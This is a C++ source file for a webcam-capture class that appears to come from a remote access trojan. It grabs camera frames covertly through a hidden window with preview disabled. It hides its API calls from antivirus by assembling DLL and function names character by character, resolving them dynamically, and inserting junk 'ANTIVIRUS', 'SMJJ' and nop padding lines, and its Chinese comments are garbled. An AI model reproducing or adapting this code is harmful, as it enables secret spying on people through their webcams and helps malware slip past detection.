// VideoCap.cpp: implementation of the CVideoCap class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "VideoCap.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

typedef HANDLE (WINAPI *CreateEventAT)
(
    __in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
    __in     BOOL bManualReset,
    __in     BOOL bInitialState,
    __in_opt LPCSTR lpName
    );

bool CVideoCap::m_bIsConnected = false;

HMODULE g_User32 = NULL;

CVideoCap::CVideoCap()
{
	char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyCreateEventA[]={'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
    CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateEventA);
	g_User32 = LoadLibrary("user32.dll");
	
	// If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released.
	m_hCaptureEvent = pCreateEventA(NULL, FALSE, FALSE, NULL);
SMJJ
	m_lpbmi = NULL;
	m_lpDIB = NULL;


	if (!IsWebCam() || m_bIsConnected)
		return;

	typedef HWND (WINAPI *tCreateWindowExA)(DWORD,LPCSTR,LPCSTR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
	tCreateWindowExA pCreateWindowExA=(tCreateWindowExA)GetProcAddress(g_User32,"CreateWindowExA");
	m_hWnd = pCreateWindowExA(0L,"#32770", "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	ANTIVIRUS

	HMODULE mHodule = LoadLibrary("AVICAP32.dll");
	typedef HWND (VFWAPI *capCreateCaptureWindowT)(LPCSTR,DWORD,int, int, int, int,HWND, int);
	capCreateCaptureWindowT pcapCreateCaptureWindow=(capCreateCaptureWindowT)GetProcAddress(mHodule,"capCreateCaptureWindowA");


	m_hWndCap = pcapCreateCaptureWindow
		(
		"CVideoCap", 
		WS_CHILD | WS_VISIBLE,
		0,
		0,
		0,
		0,
		m_hWnd,
		0
		);
	ANTIVIRUS
	FreeLibrary(mHodule);
}


// �Զ������,���õ�����ƵԴ�Ի���
LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCSTR lpsz)
{
	return (LRESULT)TRUE;
}

LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	try
	{
		CVideoCap *pThis = (CVideoCap *)capGetUserData(hWnd);
		if (pThis != NULL)
		{
			memcpy(pThis->m_lpDIB, lpVHdr->lpData, pThis->m_lpbmi->bmiHeader.biSizeImage);
			SetEvent(pThis->m_hCaptureEvent);
		}
	}catch(...){};
	return 0;
}


HMODULE mHodule = LoadLibrary("AVICAP32.dll");
typedef BOOL (VFWAPI *capGetDriverDescriptionT)(UINT,LPSTR,int,LPSTR,int);
capGetDriverDescriptionT pcapGetDriverDescription=(capGetDriverDescriptionT)GetProcAddress(mHodule,"capGetDriverDescriptionA");

bool CVideoCap::IsWebCam()
{
	// �Ѿ�������
	if (m_bIsConnected)
		return false;

	bool	bRet = false;
	

	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}

	return bRet;
}

CVideoCap::~CVideoCap()
{
	if (m_bIsConnected)
	{
		capCaptureAbort(m_hWndCap);
		capDriverDisconnect(m_hWndCap);
		
		if (m_lpbmi)
			delete m_lpbmi;
		if (m_lpDIB)
			delete m_lpDIB;
		m_bIsConnected = false;
	}
	
	capSetCallbackOnError(m_hWndCap, NULL);
	capSetCallbackOnFrame(m_hWndCap, NULL);	
	
	CloseWindow(m_hWnd);
	CloseWindow(m_hWndCap);

	CloseHandle(m_hCaptureEvent);

	FreeLibrary(g_User32);
	g_User32 = NULL;
}

LPBYTE CVideoCap::GetDIB()
{
	capGrabFrameNoStop(m_hWndCap);
	DWORD	dwRet = WaitForSingleObject(m_hCaptureEvent, 3000);

	if (dwRet == WAIT_OBJECT_0)
		return m_lpDIB;
	else
		return NULL;
}

bool CVideoCap::Initialize(int nWidth, int nHeight)
{
	CAPTUREPARMS	gCapTureParms ; //��Ƶ������������
	CAPDRIVERCAPS	gCapDriverCaps;
	DWORD			dwSize;

	if (!IsWebCam())
		return false;

	capSetUserData(m_hWndCap, this);
	
	capSetCallbackOnError(m_hWndCap, capErrorCallback);
	__asm nop;
	__asm nop;
__asm nop;
	if (!capSetCallbackOnFrame(m_hWndCap, FrameCallbackProc))
	{
		return false;
	}

	// ������ͬ����������
	for (int i = 0; i < 10; i++)
	{
		if (capDriverConnect(m_hWndCap, i))
			break;
	}
	if (i == 10)
		return false;
	
	
	dwSize = capGetVideoFormatSize(m_hWndCap);
	m_lpbmi = new BITMAPINFO;

	// M263ֻ֧��176*144 352*288 (352*288 24�ʵ�����ֻ֧��biPlanes = 1)
	capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
	// ����ָ���Ĵ�С
	if (nWidth && nHeight)
	{
 		m_lpbmi->bmiHeader.biWidth = nWidth;
 		m_lpbmi->bmiHeader.biHeight = nHeight;
		m_lpbmi->bmiHeader.biPlanes = 1;
		m_lpbmi->bmiHeader.biSizeImage = (((m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biBitCount + 31) & ~31) >> 3) * m_lpbmi->bmiHeader.biHeight;
		// ʵ���֪һЩ����ͷ��֧��ָ���ķֱ���
 		if (!capSetVideoFormat(m_hWndCap, m_lpbmi, sizeof(BITMAPINFO)))
			return false;
	}

	m_lpDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	capDriverGetCaps(m_hWndCap, &gCapDriverCaps, sizeof(CAPDRIVERCAPS));
	
	capOverlay(m_hWndCap, FALSE);
	capPreview(m_hWndCap, FALSE);	
	capPreviewScale(m_hWndCap, FALSE);

	m_bIsConnected = true;
SMJJ
	return true;
}
